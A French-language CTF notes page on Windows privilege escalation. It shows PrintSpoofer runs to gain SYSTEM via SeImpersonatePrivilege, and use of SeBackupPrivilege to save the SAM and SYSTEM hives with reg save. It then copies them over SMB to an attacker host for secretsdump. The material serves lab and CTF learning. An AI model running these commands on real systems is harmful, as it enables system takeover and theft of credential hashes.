---
title: Privilege Escalation
description: Techniques pour élever les privilèges dans les CTF. Windows/Linux
layout: default
---

# Privilege Escalation

- **SeImpersonatePrivilege**
Pour ca j'utilise `PrintSpoofer.exe`

- https://juggernaut-sec.com/seimpersonateprivilege/
- https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/

```sh
$ *Evil-WinRM* PS C:\temp> .\PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>

$ *Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/6/2025   3:07 AM          27136 PrintSpoofer.exe
-a----          6/6/2025   3:07 AM           7168 shell.exe


.*Evil-WinRM* PS C:\temp> .\PrintSpoofer.exe -i -c "c:\temp\shell.exe"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system


```



**SeBackupPrivilege/SeRestorePrivilege**
Quand on a ces deux privilege la: on peux utiliser deja le : [SeRestoreAbuse](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe)  de xct deja disponible en .exe pour exploiter le `SeRestorePrivilege`

```sh
$ *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 

```


et maintenant si c'est le `SeBackupPrivilege` alors j'utilise `reg save` pour enregister les `ntds`: 


```sh
$ *Evil-WinRM* PS C:\temo> reg save hklm\system c:\temo\system.hive
The operation completed successfully.
*Evil-WinRM* PS C:\temo> reg save hklm\sam c:\temo\sam.hive
The operation completed successfully.
*Evil-WinRM* PS C:\temo> 
```

Ensuite transfere en local pour lire les fichiers importantes avec `secretsdump` de impacket

## Transfert

```sh
$ impacket-smbserver -smb2support public share
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

$ *Evil-WinRM* PS C:\temo> copy c:\temo\sam.hive \\10.10.14.4\public\
```